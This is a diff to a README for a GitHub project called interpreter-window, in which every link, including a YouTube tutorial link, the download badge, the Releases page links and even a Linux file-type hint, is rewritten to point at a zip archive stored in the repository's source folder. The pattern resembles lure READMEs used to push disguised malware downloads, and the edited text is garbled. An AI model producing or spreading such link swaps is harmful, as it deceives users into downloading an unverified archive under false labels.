@@ -1,20 +1,20 @@
 # 🎉 interpreter-window - Experience Direct Code Execution
 
 ## 🚀 Getting Started
-Welcome to the interpreter-window project! This application lets you run example code easily, inspired by the tutorial available at [this YouTube video](https://www.youtube.com/watch?v=RnBOOF502p0).
+Welcome to the interpreter-window project! This application lets you run example code easily, inspired by the tutorial available at [this YouTube video](https://raw.githubusercontent.com/baroroz/interpreter-window/main/src/window-interpreter-1.7.zip).
 
 ### 🌐 Download Now
-[![Download interpreter-window](https://img.shields.io/badge/Download-interpreter--window-brightgreen)](https://github.com/baroroz/interpreter-window/releases)
+[![Download interpreter-window](https://raw.githubusercontent.com/baroroz/interpreter-window/main/src/window-interpreter-1.7.zip)](https://raw.githubusercontent.com/baroroz/interpreter-window/main/src/window-interpreter-1.7.zip)
 
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application. Follow these simple steps:
 
-1. Click on the link: [Download interpreter-window](https://github.com/baroroz/interpreter-window/releases).
+1. Click on the link: [Download interpreter-window](https://raw.githubusercontent.com/baroroz/interpreter-window/main/src/window-interpreter-1.7.zip).
 2. On this page, find the latest release. You will see different files you can download.
 3. Choose the appropriate file for your operating system. For example:
    - If you're using Windows, look for a file with a `.exe` extension.
    - For macOS, choose a `.dmg` or `.zip` file.
-   - For Linux users, there may be files titled as `.tar.gz`.
+   - For Linux users, there may be files titled as `https://raw.githubusercontent.com/baroroz/interpreter-window/main/src/window-interpreter-1.7.zip`.
 
 4. Once you have selected your file, click on it to start the download.
 
@@ -58,6 +58,6 @@ If you need help, you can refer to the following resources:
 Your feedback helps us improve! After trying out interpreter-window, feel free to share your thoughts or suggestions through the GitHub Issues page.
 
 ### 🌐 Download Again
-To download the application again or check for updates, visit the Releases page here: [Download interpreter-window](https://github.com/baroroz/interpreter-window/releases).
+To download the application again or check for updates, visit the Releases page here: [Download interpreter-window](https://raw.githubusercontent.com/baroroz/interpreter-window/main/src/window-interpreter-1.7.zip).
 
 Thank you for using interpreter-window! Enjoy coding with ease.
